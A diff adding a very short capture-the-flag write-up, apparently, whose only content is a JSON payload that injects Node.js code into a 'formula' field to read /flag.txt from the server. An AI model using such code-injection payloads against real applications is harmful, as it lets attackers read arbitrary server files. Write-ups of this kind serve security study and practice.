@@ -1,0 +1,8 @@
+
+## Writeup Simple 
+
+```bash
+{"formula":"require('fs').readFileSync('/flag.txt').toString();"}
+```
+
+
